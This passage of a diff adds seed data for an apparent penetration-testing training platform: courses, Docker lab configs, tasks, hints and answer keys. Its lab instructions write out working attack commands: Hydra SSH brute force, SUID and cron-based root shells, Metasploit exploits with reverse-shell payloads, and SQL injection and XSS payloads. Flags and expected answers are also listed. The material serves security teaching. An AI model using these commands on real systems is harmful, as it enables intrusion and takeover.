+                "delay_minutes": 7
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "course_id": "783b6dea-51be-4d07-a5c4-7f38098d3f7a",
+    "title": "Network Penetration Testing",
+    "description": "Learn systematic network reconnaissance, service enumeration, and exploitation techniques used by professional penetration testers and red teamers.",
+    "difficulty_level": "intermediate",
+    "category": "Network Security",
+    "estimated_hours": 8.0,
+    "is_published": true,
+    "labs": [
+      {
+        "lab_id": "2e8d2416-bbaa-405a-b9ce-a33d8466bda9",
+        "title": "Network Reconnaissance with Nmap",
+        "description": "Master the industry-standard network scanner. Learn to discover hosts, enumerate open ports, identify services, and detect operating systems.",
+        "difficulty": "beginner",
+        "docker_compose_config": {
+          "version": "3",
+          "networks": {
+            "lab-net": {
+              "driver": "bridge"
+            }
+          },
+          "services": {
+            "victim": {
+              "image": "vulnerables/web-dvwa",
+              "networks": [
+                "lab-net"
+              ]
+            },
+            "attacker": {
+              "image": "kalilinux/kali-rolling",
+              "networks": [
+                "lab-net"
+              ]
+            }
+          }
+        },
+        "has_auto_solve": true,
+        "max_duration_minutes": 35,
+        "sort_order": 0,
+        "is_published": true,
+        "tasks": [
+          {
+            "task_id": "468c0ea3-e34f-4890-8f27-f4c0c64818e4",
+            "title": "Port Discovery",
+            "instructions": "Scan the target machine at 10.10.14.5 and identify all open TCP ports.\n\nUse nmap with the -sV flag for version detection.\n\n```bash\nnmap -sV 10.10.14.5\n```\n\nHow many open ports did you find?",
+            "expected_answer": "3",
+            "autosolve_commands": [],
+            "sort_order": 0,
+            "hints": [
+              {
+                "hint_id": "2868f32e-6744-43ac-b1dd-195a129a6bcc",
+                "hint_text": "Run: nmap -sV 10.10.14.5 and count the ports listed as 'open'.",
+                "hint_order": 1,
+                "delay_minutes": 2
+              },
+              {
+                "hint_id": "736da944-b93f-4c00-8ced-8bf1a39e6320",
+                "hint_text": "The open ports are: 22 (SSH), 80 (HTTP), and 443 (HTTPS).",
+                "hint_order": 2,
+                "delay_minutes": 4
+              }
+            ]
+          },
+          {
+            "task_id": "ea11fbd5-c92c-4d7a-b65c-7d488efafb4f",
+            "title": "Service Identification",
+            "instructions": "Identify the exact version of the SSH service running on port 22.\n\nUse nmap's version detection (-sV) or aggressive scan (-A).\n\nSubmit the SSH version string (e.g., OpenSSH X.Y).",
+            "expected_answer": "OpenSSH 8.9",
+            "autosolve_commands": [],
+            "sort_order": 1,
+            "hints": [
+              {
+                "hint_id": "e5946258-deea-4f45-a208-36a321095116",
+                "hint_text": "Run: nmap -sV -p22 10.10.14.5",
+                "hint_order": 1,
+                "delay_minutes": 2
+              },
+              {
+                "hint_id": "a5b2c0ab-1bdc-4847-8206-126de2af75c0",
+                "hint_text": "Look at the VERSION column in the nmap output for port 22.",
+                "hint_order": 2,
+                "delay_minutes": 4
+              }
+            ]
+          },
+          {
+            "task_id": "4a881165-4a19-4eac-ae53-ec78abdc9176",
+            "title": "OS Detection",
+            "instructions": "Determine the operating system of the target machine.\n\nUse nmap's OS detection feature.\n\n```bash\nnmap -O 10.10.14.5\n```\n\nWhat OS family is the target running? (Linux/Windows)",
+            "expected_answer": "Linux",
+            "autosolve_commands": [],
+            "sort_order": 2,
+            "hints": [
+              {
+                "hint_id": "b1e81077-2664-4968-a892-d4c362dacf0a",
+                "hint_text": "The -O flag enables OS detection. You may need sudo/root privileges.",
+                "hint_order": 1,
+                "delay_minutes": 3
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "lab_id": "1be2cabd-8e43-46ac-86a4-ea98d587653f",
+        "title": "SSH Brute Force Attack",
+        "description": "Learn password guessing techniques using Hydra. Understand the importance of strong passwords and how attackers exploit weak credentials.",
+        "difficulty": "intermediate",
+        "docker_compose_config": {
+          "version": "3",
+          "networks": {
+            "lab-net": {
+              "driver": "bridge"
+            }
+          },
+          "services": {
+            "victim": {
+              "image": "vulnerables/web-dvwa",
+              "networks": [
+                "lab-net"
+              ]
+            },
+            "attacker": {
+              "image": "kalilinux/kali-rolling",
+              "networks": [
+                "lab-net"
+              ]
+            }
+          }
+        },
+        "has_auto_solve": true,
+        "max_duration_minutes": 30,
+        "sort_order": 1,
+        "is_published": true,
+        "tasks": [
+          {
+            "task_id": "a7bb3eb5-6f38-4922-9a1f-e8b42f1b34c0",
+            "title": "Dictionary Attack",
+            "instructions": "Use Hydra to brute-force the SSH login on 10.10.14.5.\n\nA wordlist is provided at /usr/share/wordlists/rockyou.txt.\nThe username is 'admin'.\n\n```bash\nhydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.14.5\n```\n\nWhat is the admin's password?",
+            "expected_answer": "password123",
+            "autosolve_commands": [],
+            "sort_order": 0,
+            "hints": [
+              {
+                "hint_id": "21da7a59-8c54-431b-b905-5433ff019b81",
+                "hint_text": "Hydra will try each password from the wordlist. Watch for a line showing [22][ssh] host: 10.10.14.5 login: admin password: ???",
+                "hint_order": 1,
+                "delay_minutes": 3
+              },
+              {
+                "hint_id": "79e90e22-6fdc-4b6d-bf72-0271cc888b1e",
+                "hint_text": "The password is one of the most common passwords in the rockyou.txt wordlist.",
+                "hint_order": 2,
+                "delay_minutes": 5
+              }
+            ]
+          },
+          {
+            "task_id": "1cf4a4fd-7500-4c70-8c36-935574dde509",
+            "title": "Post-Exploitation",
+            "instructions": "Now that you have SSH access, log in and find the flag file.\n\n```bash\nssh admin@10.10.14.5\nfind / -name 'flag.txt' 2>/dev/null\ncat /home/admin/flag.txt\n```\n\nSubmit the flag contents.",
+            "expected_answer": "CTF{ssh_brut3_f0rc3_succ3ss}",
+            "autosolve_commands": [],
+            "sort_order": 1,
+            "hints": [
+              {
+                "hint_id": "2244d66f-9008-46b7-954e-a58208eef57b",
+                "hint_text": "Use the 'find' command to search for flag.txt across the filesystem.",
+                "hint_order": 1,
+                "delay_minutes": 3
+              },
+              {
+                "hint_id": "c413cb99-baac-4eef-a53d-9e4e447b1978",
+                "hint_text": "The flag is located at /home/admin/flag.txt",
+                "hint_order": 2,
+                "delay_minutes": 5
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "lab_id": "d4cc4e52-3ddc-4f52-a98e-bbcfc86381be",
+        "title": "Wireshark Traffic Analysis",
+        "description": "Analyze network packet captures to detect attacks, extract credentials, and reconstruct communication flows.",
+        "difficulty": "intermediate",
+        "docker_compose_config": {
+          "version": "3",
+          "networks": {
+            "lab-net": {
+              "driver": "bridge"
+            }
+          },
+          "services": {
+            "victim": {
+              "image": "vulnerables/web-dvwa",
+              "networks": [
+                "lab-net"
+              ]
+            },
+            "attacker": {
+              "image": "kalilinux/kali-rolling",
+              "networks": [
+                "lab-net"
+              ]
+            }
+          }
+        },
+        "has_auto_solve": false,
+        "max_duration_minutes": 45,
+        "sort_order": 2,
+        "is_published": true,
+        "tasks": [
+          {
+            "task_id": "daf16273-a55a-4115-a8ac-2551df674b35",
+            "title": "Credential Sniffing",
+            "instructions": "Open the provided PCAP file in Wireshark and analyze the captured HTTP traffic.\n\nFilter for HTTP POST requests to find transmitted login credentials.\n\nWhat Wireshark display filter shows only HTTP POST requests?",
+            "expected_answer": "http.request.method == POST",
+            "autosolve_commands": [],
+            "sort_order": 0,
+            "hints": [
+              {
+                "hint_id": "796ac10a-d9cf-4e09-9626-6ab7d2a51b43",
+                "hint_text": "Wireshark display filters use field names like http.request.method.",
+                "hint_order": 1,
+                "delay_minutes": 3
+              },
+              {
+                "hint_id": "ce842080-7b73-4eaa-8076-1b280c97774e",
+                "hint_text": "The filter syntax uses == for equality comparison.",
+                "hint_order": 2,
+                "delay_minutes": 5
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "course_id": "2fb1c6bf-9229-4ef3-9b33-10c0943e36ee",
+    "title": "Linux Privilege Escalation",
+    "description": "Learn to escalate from a low-privilege shell to root access on Linux systems. Cover SUID binaries, cron jobs, kernel exploits, and misconfigured services.",
+    "difficulty_level": "advanced",
+    "category": "Red Team",
+    "estimated_hours": 10.0,
+    "is_published": true,
+    "labs": [
+      {
+        "lab_id": "04d1d7e9-ee12-4cda-b893-5524f5ed7a74",
+        "title": "SUID Binary Exploitation",
+        "description": "Discover and exploit SUID binaries that can be abused to escalate privileges to root on a Linux target.",
+        "difficulty": "advanced",
+        "docker_compose_config": {
+          "version": "3",
+          "networks": {
+            "lab-net": {
+              "driver": "bridge"
+            }
+          },
+          "services": {
+            "victim": {
+              "image": "vulnerables/web-dvwa",
+              "networks": [
+                "lab-net"
+              ]
+            },
+            "attacker": {
+              "image": "kalilinux/kali-rolling",
+              "networks": [
+                "lab-net"
+              ]
+            }
+          }
+        },
+        "has_auto_solve": true,
+        "max_duration_minutes": 60,
+        "sort_order": 0,
+        "is_published": true,
+        "tasks": [
+          {
+            "task_id": "517aa287-0806-41f9-ab95-a59d2fa2b089",
+            "title": "Find SUID Binaries",
+            "instructions": "You have a low-privilege shell on the target. Find all SUID binaries on the system.\n\n```bash\nfind / -perm -4000 -type f 2>/dev/null\n```\n\nWhat command-line flag in 'find' searches for SUID permissions?",
+            "expected_answer": "-perm -4000",
+            "autosolve_commands": [],
+            "sort_order": 0,
+            "hints": [
+              {
+                "hint_id": "f0ef013d-5426-4da7-8191-21f6022f5884",
+                "hint_text": "SUID files have the setuid bit set, which is represented as 4000 in octal permissions.",
+                "hint_order": 1,
+                "delay_minutes": 3
+              },
+              {
+                "hint_id": "08c9ecc4-0245-4de6-b351-41826898db9b",
+                "hint_text": "Use find with -perm flag. The dash before 4000 means 'at least these permissions'.",
+                "hint_order": 2,
+                "delay_minutes": 5
+              }
+            ]
+          },
+          {
+            "task_id": "64ca2c4f-40e1-481e-8bec-3d1bb730aa66",
+            "title": "Exploit the Binary",
+            "instructions": "The /usr/bin/python3 binary has the SUID bit set (owned by root).\n\nUse it to spawn a root shell.\n\n```bash\n/usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'  \n```\n\nWhat Python function is used to change the effective user ID to root?",
+            "expected_answer": "os.setuid",
+            "autosolve_commands": [],
+            "sort_order": 1,
+            "hints": [
+              {
+                "hint_id": "e6779520-27fa-4d3b-b93e-b749b9f9eabb",
+                "hint_text": "When a SUID binary runs as root, you can use it to change your effective user ID.",
+                "hint_order": 1,
+                "delay_minutes": 4
+              },
+              {
+                "hint_id": "e58ce5e6-d606-4747-ab63-c83b4147981b",
+                "hint_text": "The os module in Python has setuid() and system() functions. setuid(0) = become root.",
+                "hint_order": 2,
+                "delay_minutes": 6
+              }
+            ]
+          },
+          {
+            "task_id": "7d65ad8c-0de2-455d-a55e-d543353f4a75",
+            "title": "Capture the Root Flag",
+            "instructions": "Now that you have root access, read the flag file.\n\n```bash\ncat /root/flag.txt\n```\n\nSubmit the flag.",
+            "expected_answer": "CTF{su1d_pr1v3sc_r00t3d}",
+            "autosolve_commands": [],
+            "sort_order": 2,
+            "hints": [
+              {
+                "hint_id": "5bc1ae3b-afec-4e24-b7fe-7233170098a0",
+                "hint_text": "Root flags are typically stored in /root/.",
+                "hint_order": 1,
+                "delay_minutes": 2
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "lab_id": "78cf07c6-a826-49f4-9ff9-43564a404610",
+        "title": "Cron Job Hijacking",
+        "description": "Exploit misconfigured cron jobs to achieve privilege escalation by modifying scripts that run as root.",
+        "difficulty": "advanced",
+        "docker_compose_config": {
+          "version": "3",
+          "networks": {
+            "lab-net": {
+              "driver": "bridge"
+            }
+          },
+          "services": {
+            "victim": {
+              "image": "vulnerables/web-dvwa",
+              "networks": [
+                "lab-net"
+              ]
+            },
+            "attacker": {
+              "image": "kalilinux/kali-rolling",
+              "networks": [
+                "lab-net"
+              ]
+            }
+          }
+        },
+        "has_auto_solve": true,
+        "max_duration_minutes": 50,
+        "sort_order": 1,
+        "is_published": true,
+        "tasks": [
+          {
+            "task_id": "6d9afb3d-1fcb-4d50-9d61-47d8c7ef8c5f",
+            "title": "Discover Cron Jobs",
+            "instructions": "Enumerate the system's scheduled cron jobs to find one running as root.\n\n```bash\ncat /etc/crontab\nls -la /etc/cron.d/\n```\n\nWhat file contains system-wide cron job definitions?",
+            "expected_answer": "/etc/crontab",
+            "autosolve_commands": [],
+            "sort_order": 0,
+            "hints": [
+              {
+                "hint_id": "4e5a2412-20fe-46ed-bc93-521248cafdfc",
+                "hint_text": "System-wide cron jobs are defined in /etc/crontab and files within /etc/cron.d/.",
+                "hint_order": 1,
+                "delay_minutes": 3
+              }
+            ]
+          },
+          {
+            "task_id": "8838b1e1-8072-4a23-8a94-63287267acb6",
+            "title": "Hijack the Script",
+            "instructions": "A cron job runs /opt/backup.sh as root every minute, and the file is world-writable.\n\nModify the script to add a reverse shell or create a root SUID shell.\n\n```bash\necho 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/backup.sh\n```\n\nAfter 1 minute, run: /tmp/rootbash -p\n\nWhat flag makes bash preserve the SUID effective UID?",
+            "expected_answer": "-p",
+            "autosolve_commands": [],
+            "sort_order": 1,
+            "hints": [
+              {
+                "hint_id": "0c2b03c7-5329-4a10-9f77-c87b941ed443",
+                "hint_text": "Bash drops privileges by default. The -p flag tells it to keep the effective UID.",
+                "hint_order": 1,
+                "delay_minutes": 4
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "course_id": "8203b4d1-5336-46da-8438-30c523fc07c0",
+    "title": "Metasploit Framework",
+    "description": "Master the Metasploit Framework — the world's most widely used penetration testing tool. Learn to scan, exploit, and gain access to vulnerable systems using Metasploitable 2 as your target machine.",
+    "difficulty_level": "intermediate",
+    "category": "Red Team",
+    "estimated_hours": 5.0,
+    "is_published": true,
+    "labs": [
+      {
+        "lab_id": "8fc627a2-0eb8-4d1a-919b-e083e9e2f14d",
+        "title": "Exploiting Metasploitable 2",
+        "description": "Use the Metasploit Framework to discover and exploit real vulnerabilities on a Metasploitable 2 target machine. You will perform reconnaissance, identify vulnerable services, and use Metasploit modules to gain remote access.",
+        "difficulty": "intermediate",
+        "docker_compose_config": {
+          "version": "3",
+          "networks": {
+            "lab-net": {
+              "driver": "bridge"
+            }
+          },
+          "services": {
+            "victim": {
+              "image": "tleemcjr/metasploitable2",
+              "networks": [
+                "lab-net"
+              ]
+            },
+            "attacker": {
+              "image": "kalilinux/kali-rolling",
+              "networks": [
+                "lab-net"
+              ]
+            }
+          }
+        },
+        "has_auto_solve": true,
+        "max_duration_minutes": 60,
+        "sort_order": 0,
+        "is_published": true,
+        "tasks": [
+          {
+            "task_id": "0271b64a-9211-4008-b92b-a6258e86caa5",
+            "title": "Reconnaissance – Service Discovery",
+            "instructions": "Your first step in any penetration test is reconnaissance. The Metasploitable 2 target is running at **10.10.14.10**.\n\nUse Nmap to scan the target and discover all open TCP ports and their service versions.\n\n```bash\nnmap -sV 10.10.14.10\n```\n\nAmong the services you discover, you will find an FTP server running on port 21.\n\n**Question:** What is the exact version of the FTP service running on port 21? (e.g., vsftpd X.X.X)",
+            "expected_answer": "vsftpd 2.3.4",
+            "autosolve_commands": [],
+            "sort_order": 0,
+            "hints": [
+              {
+                "hint_id": "2da9ab75-881a-4055-bd1b-98efc09826e2",
+                "hint_text": "Run: nmap -sV 10.10.14.10 and look at the VERSION column for port 21.",
+                "hint_order": 1,
+                "delay_minutes": 3
+              },
+              {
+                "hint_id": "58eb9cdd-fbaa-4217-b35b-a59f454d44b9",
+                "hint_text": "The FTP service is vsftpd. Look at the exact version number reported by Nmap.",
+                "hint_order": 2,
+                "delay_minutes": 5
+              },
+              {
+                "hint_id": "14b55e39-9d07-4085-ade6-fb251f01ff1d",
+                "hint_text": "The answer is: vsftpd 2.3.4 — this version has a famous backdoor vulnerability.",
+                "hint_order": 3,
+                "delay_minutes": 8
+              }
+            ]
+          },
+          {
+            "task_id": "bdb84ab8-8d0d-45d8-8c3f-1617f3178f60",
+            "title": "Exploit vsftpd 2.3.4 Backdoor",
+            "instructions": "The vsftpd 2.3.4 service has a well-known backdoor that was inserted into the source code. When triggered, it opens a shell on port 6200.\n\nUse Metasploit to exploit this vulnerability:\n\n```bash\nmsfconsole\nuse exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 10.10.14.10\nrun\n```\n\nOnce you get a shell, identify who you are.\n\n```bash\nwhoami\n```\n\n**Question:** What user did you gain access as after exploiting the vsftpd backdoor?",
+            "expected_answer": "root",
+            "autosolve_commands": [],
+            "sort_order": 1,
+            "hints": [
+              {
+                "hint_id": "2395c7c3-881b-4c66-8546-145a0e012948",
+                "hint_text": "In msfconsole, search for the vsftpd module: search vsftpd",
+                "hint_order": 1,
+                "delay_minutes": 3
+              },
+              {
+                "hint_id": "c0ed2257-9696-4b94-ba50-81da69bb48b2",
+                "hint_text": "After running the exploit, a command shell session should open. Type 'whoami' to see your user.",
+                "hint_order": 2,
+                "delay_minutes": 5
+              },
+              {
+                "hint_id": "eeb54812-7eee-45c9-8ff1-8a32e367300c",
+                "hint_text": "The vsftpd 2.3.4 backdoor gives you root access directly. The answer is: root",
+                "hint_order": 3,
+                "delay_minutes": 8
+              }
+            ]
+          },
+          {
+            "task_id": "247679be-b3bf-44ff-aa2e-aa9d53ed85a5",
+            "title": "Exploit Samba usermap_script",
+            "instructions": "Metasploitable 2 also runs a vulnerable Samba service (port 139/445). The Samba version has a critical vulnerability that allows remote command execution via the 'username map script' configuration option.\n\nUse Metasploit to exploit it:\n\n```bash\nmsfconsole\nuse exploit/multi/samba/usermap_script\nset RHOSTS 10.10.14.10\nset LHOST <your-ip>\nset payload cmd/unix/reverse\nrun\n```\n\nAfter gaining a shell, find the hostname of the target machine:\n\n```bash\nhostname\n```\n\n**Question:** What is the hostname of the Metasploitable 2 machine?",
+            "expected_answer": "metasploitable",
+            "autosolve_commands": [],
+            "sort_order": 2,
+            "hints": [
+              {
+                "hint_id": "35cf9dd4-4309-43ea-aa20-ebf4b9d1362e",
+                "hint_text": "Search for the Samba module in Metasploit: search usermap_script",
+                "hint_order": 1,
+                "delay_minutes": 3
+              },
+              {
+                "hint_id": "bcba1e2b-56e7-43e0-aa69-fe7f436add3b",
+                "hint_text": "Make sure to set LHOST to your attacker machine's IP address so the reverse shell connects back to you.",
+                "hint_order": 2,
+                "delay_minutes": 5
+              },
+              {
+                "hint_id": "0ef69561-64f3-4661-b70d-2dc747cad247",
+                "hint_text": "Once you have a shell, run 'hostname'. The default hostname of Metasploitable 2 is: metasploitable",
+                "hint_order": 3,
+                "delay_minutes": 8
+              }
+            ]
+          },
+          {
+            "task_id": "77b0311d-8c8c-4484-8131-0c7432b20d00",
+            "title": "Exploit distccd Vulnerability",
+            "instructions": "Metasploitable 2 runs a vulnerable distccd service on port 3632. DistCC is a distributed compiler daemon, and this version allows unauthenticated remote code execution.\n\nUse Metasploit to exploit it:\n\n```bash\nmsfconsole\nuse exploit/unix/misc/distcc_exec\nset RHOSTS 10.10.14.10\nset payload cmd/unix/reverse\nset LHOST <your-ip>\nrun\n```\n\nOnce you gain access, check which user you are running as:\n\n```bash\nwhoami\n```\n\nNotice that unlike vsftpd, this exploit gives you a **non-root** user.\n\n**Question:** What user did you gain access as through the distccd exploit?",
+            "expected_answer": "daemon",
+            "autosolve_commands": [],
+            "sort_order": 3,
+            "hints": [
+              {
+                "hint_id": "152c2306-544e-4c5d-8500-95f3deff266e",
+                "hint_text": "Search for the distcc module: search distcc in msfconsole.",
+                "hint_order": 1,
+                "delay_minutes": 3
+              },
+              {
+                "hint_id": "8abec20d-966e-4507-baf6-0db34bd56058",
+                "hint_text": "The distccd service typically runs as a low-privilege user, not root. Run 'whoami' after exploitation.",
+                "hint_order": 2,
+                "delay_minutes": 5
+              },
+              {
+                "hint_id": "b4ba7b1b-1274-4a96-a842-5187152287b5",
+                "hint_text": "The distccd service runs as the 'daemon' user. The answer is: daemon",
+                "hint_order": 3,
+                "delay_minutes": 8
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "course_id": "729ac68b-7f0a-49f8-a2b9-d8cc62642f3d",
+    "title": "Network Reconnaissance",
+    "description": "Master the art of mapping networks, identifying services, and gathering intelligence before launching any attack.\n\n[SEED-DATA]",
+    "difficulty_level": "beginner",
+    "category": "Reconnaissance",
+    "estimated_hours": 4.0,
+    "is_published": true,
+    "labs": [
+      {
+        "lab_id": "542ded79-4624-4d4c-92ca-fbd26904521f",
+        "title": "Nmap Fundamentals",
+        "description": "Learn the basic Nmap scan types — TCP SYN scans, version detection, and service fingerprinting.",
+        "difficulty": "beginner",
+        "docker_compose_config": {
+          "services": {
+            "victim": {
+              "image": "kali:latest",
+              "ports": [
+                "22",
+                "80"
+              ]
+            }
+          },
+          "auto_solve_script": "# Full reconnaissance against the lab target\nnmap -sV 172.25.0.10               # version scan all default ports\nnmap -sV -p 22,80 172.25.0.10      # specific ports\nnmap -sC -A 172.25.0.10 -oN recon.txt  # scripts + OS detection"
+        },
+        "has_auto_solve": true,
+        "max_duration_minutes": 120,
+        "sort_order": 0,
+        "is_published": true,
+        "tasks": [
+          {
+            "task_id": "3ee70d5d-c1f4-4080-ad48-aa235920b752",
+            "title": "Find the SSH port",
+            "instructions": "Run a service scan against the target at 172.25.0.10.\n\nCommand: nmap -sV 172.25.0.10\n\nWhich port number is SSH running on? Submit just the number.",
+            "expected_answer": "22",
+            "autosolve_commands": [],
+            "sort_order": 0,
+            "hints": [
+              {
+                "hint_id": "caace6bd-4180-407e-a1f9-90769501bfe4",
+                "hint_text": "Use nmap -sV 172.25.0.10 to detect open ports and their versions.",
+                "hint_order": 1,
+                "delay_minutes": 0
+              },
+              {
+                "hint_id": "92cdf923-be3a-40fc-9aa3-28b85e233160",
+                "hint_text": "Look for the line containing 'ssh' — the port number is on the left.",
+                "hint_order": 2,
+                "delay_minutes": 0
+              }
+            ]
+          },
+          {
+            "task_id": "fdfb17f8-3be2-4636-878f-c0b8b30d8304",
+            "title": "Identify the web server",
+            "instructions": "The target runs a web server on port 80.\n\nCommand: nmap -sV -p 80 172.25.0.10\n\nWhat web server software is running? Submit just the server name (e.g. Apache).",
+            "expected_answer": "Apache",
+            "autosolve_commands": [],
+            "sort_order": 1,
+            "hints": [
+              {
+                "hint_id": "5a32e6eb-f217-4b75-b9b7-ae7fd287c10c",
+                "hint_text": "Run: nmap -sV -p 80 172.25.0.10",
+                "hint_order": 1,
+                "delay_minutes": 0
+              },
+              {
+                "hint_id": "f63d486a-558c-4974-8294-f9a60b2dc5de",
+                "hint_text": "The service version field shows the server name — look for 'Apache' or 'nginx'.",
+                "hint_order": 2,
+                "delay_minutes": 0
+              }
+            ]
+          },
+          {
+            "task_id": "090b5dc6-c765-4c6f-ab0c-74d262bc7311",
+            "title": "Count open ports",
+            "instructions": "Run a full scan of the target at 172.25.0.10.\n\nCommand: nmap -sV 172.25.0.10\n\nHow many TCP ports are open? Submit the count as a number.",
+            "expected_answer": "2",
+            "autosolve_commands": [],
+            "sort_order": 2,
+            "hints": [
+              {
+                "hint_id": "ae0cbb14-831c-4767-8a05-e428ff5883d9",
+                "hint_text": "Count lines containing 'open' in the nmap output.",
+                "hint_order": 1,
+                "delay_minutes": 0
+              },
+              {
+                "hint_id": "4c775ebd-c320-4416-a7dd-a3e12763ec05",
+                "hint_text": "The target has SSH and HTTP — that is 2 open ports.",
+                "hint_order": 2,
+                "delay_minutes": 0
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "lab_id": "074917ac-4726-49d6-af12-2daa741e264c",
+        "title": "Service Enumeration Deep Dive",
+        "description": "Once you've found open ports, the next step is interrogating each service for version details and hidden endpoints.",
+        "difficulty": "beginner",
+        "docker_compose_config": {
+          "services": {
+            "victim": {
+              "image": "kali:latest",
+              "ports": [
+                "22",
+                "80"
+              ]
+            }
+          },
+          "auto_solve_script": "nmap -sC -sV -p 22,80 172.25.0.10\nnc 172.25.0.10 22                   # grab SSH banner\ncurl -I http://172.25.0.10/admin    # check /admin response"
+        },
+        "has_auto_solve": true,
+        "max_duration_minutes": 120,
+        "sort_order": 1,
+        "is_published": true,
+        "tasks": [
+          {
+            "task_id": "913f04d1-4c9f-445c-aef1-7e230526fafc",
+            "title": "SSH banner grabbing",
+            "instructions": "Grab the SSH service banner from the target to identify the protocol version.\n\nCommand: nc 172.25.0.10 22\n\nThe first line begins with SSH-X.X — submit just the version number (e.g. 2.0).",
+            "expected_answer": "2.0",
+            "autosolve_commands": [],
+            "sort_order": 0,
+            "hints": [
+              {
+                "hint_id": "5b369299-150f-4d62-a0b2-72b229b7fd36",
+                "hint_text": "Connect with: nc 172.25.0.10 22 — the banner prints immediately.",
+                "hint_order": 1,
+                "delay_minutes": 0
+              },
+              {
+                "hint_id": "a4a4b9aa-afb9-4f79-ba08-b89669a0c2cc",
+                "hint_text": "The line looks like: SSH-2.0-OpenSSH_... — submit only '2.0'.",
+                "hint_order": 2,
+                "delay_minutes": 0
+              }
+            ]
+          },
+          {
+            "task_id": "a0f0a86c-72e9-4044-90bf-5a51ffbc2acb",
+            "title": "Hidden directory discovery",
+            "instructions": "The web server on 172.25.0.10 has a password-protected /admin endpoint.\n\nCommand: curl -I http://172.25.0.10/admin/\n\nWhat HTTP status code does it return? Submit just the number.",
+            "expected_answer": "401",
+            "autosolve_commands": [],
+            "sort_order": 1,
+            "hints": [
+              {
+                "hint_id": "3b5327f7-371d-4f8f-a30a-e70c80d6de08",
+                "hint_text": "Use curl -I http://172.25.0.10/admin/ to see the response headers.",
+                "hint_order": 1,
+                "delay_minutes": 0
+              },
+              {
+                "hint_id": "9c36c2ac-7467-40db-9f45-f38df02a6dd1",
+                "hint_text": "A 401 status means the resource exists but requires authentication.",
+                "hint_order": 2,
+                "delay_minutes": 0
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "course_id": "1c1d5c3d-2df8-4dd5-b94b-0d3d33c48114",
+    "title": "Web Application Attacks",
+    "description": "Exploit common web vulnerabilities — SQL injection, XSS, broken authentication — in a guided lab environment.\n\n[SEED-DATA]",
+    "difficulty_level": "intermediate",
+    "category": "Web",
+    "estimated_hours": 6.0,
+    "is_published": true,
+    "labs": [
+      {
+        "lab_id": "3bb96047-a9da-498d-bb34-687db9deead2",
+        "title": "SQL Injection Basics",
+        "description": "Identify and exploit a textbook SQL injection in a vulnerable login form.",
+        "difficulty": "intermediate",
+        "docker_compose_config": {
+          "services": {
+            "victim": {
+              "image": "kali:latest",
+              "ports": [
+                "22",
+                "80"
+              ]
+            }
+          },
+          "auto_solve_script": "# Bypass authentication via SQLi\ncurl -X POST http://10.10.14.5/login -d \"username=admin' OR '1'='1&password=x\"\n# Extract DB structure\nsqlmap -u 'http://10.10.14.5/login' --data 'username=a&password=b' --dbs"
+        },
+        "has_auto_solve": true,
+        "max_duration_minutes": 120,
+        "sort_order": 0,
+        "is_published": true,
+        "tasks": [
+          {
+            "task_id": "a1911ffa-f2e6-4ec7-9414-f44ae179f0ba",
+            "title": "Authenticate as admin",
+            "instructions": "The login form is vulnerable. Submit the username you used to log in (no password needed).",
+            "expected_answer": "admin",
+            "autosolve_commands": [],
+            "sort_order": 0,
+            "hints": [
+              {
+                "hint_id": "3fc54d6e-991a-4ac0-96f2-cb46d449d27d",
+                "hint_text": "Try a classic SQLi payload: ' OR '1'='1",
+                "hint_order": 1,
+                "delay_minutes": 0
+              },
+              {
+                "hint_id": "91cd0945-d9ac-4ea1-85b9-aa01deeeabb7",
+                "hint_text": "Username: admin' OR '1'='1 — password can be anything.",
+                "hint_order": 2,
+                "delay_minutes": 0
+              }
+            ]
+          },
+          {
+            "task_id": "40b31aec-8459-49d2-b4cc-6e50ae20a78d",
+            "title": "Find the database name",
+            "instructions": "Using sqlmap or manual injection, extract the current database name.",
+            "expected_answer": "webapp",
+            "autosolve_commands": [],
+            "sort_order": 1,
+            "hints": [
+              {
+                "hint_id": "8e9f7e4f-406e-4a30-9b15-51c4166775e3",
+                "hint_text": "sqlmap can automate this with the --current-db flag.",
+                "hint_order": 1,
+                "delay_minutes": 0
+              },
+              {
+                "hint_id": "806e0975-e682-4219-8457-51063eeb759c",
+                "hint_text": "sqlmap -u <url> --data '...' --current-db",
+                "hint_order": 2,
+                "delay_minutes": 0
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "lab_id": "e6dfd506-061c-459b-8ff8-bcb2c326eb85",
+        "title": "Cross-Site Scripting (XSS)",
+        "description": "Find and exploit reflected and stored XSS to steal session cookies.",
+        "difficulty": "intermediate",
+        "docker_compose_config": {
+          "services": {
+            "victim": {
+              "image": "kali:latest",
+              "ports": [
+                "22",
+                "80"
+              ]
+            }
+          }
+        },
+        "has_auto_solve": false,
+        "max_duration_minutes": 120,
+        "sort_order": 1,
+        "is_published": true,
+        "tasks": [
+          {
+            "task_id": "911f28ae-e075-4d1c-b75c-4e265f2c45b4",
+            "title": "Reflected XSS payload",
+            "instructions": "Submit a payload that triggers an alert(1) in the search box. Submit the URL parameter value.",
+            "expected_answer": "<script>alert(1)</script>",
+            "autosolve_commands": [],
+            "sort_order": 0,
+            "hints": [
+              {
+                "hint_id": "23bafced-cf4d-4cc2-aa8c-69bbecaeb48a",
+                "hint_text": "The search parameter is reflected unescaped in the response.",
+                "hint_order": 1,
+                "delay_minutes": 0
+              },
+              {
+                "hint_id": "f5c15fe2-8502-4674-8d0a-962a19239857",
+                "hint_text": "Try injecting raw HTML: <script>alert(1)</script>",
+                "hint_order": 2,
+                "delay_minutes": 0
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "course_id": "e1340c6f-da73-4dcc-bf71-62da0d0c85ae",
+    "title": "Privilege Escalation on Linux",
+    "description": "You have a foothold — now escalate to root. Cover SUID abuse, cron jobs, sudo misconfigurations, and kernel exploits.\n\n[SEED-DATA]",
+    "difficulty_level": "advanced",
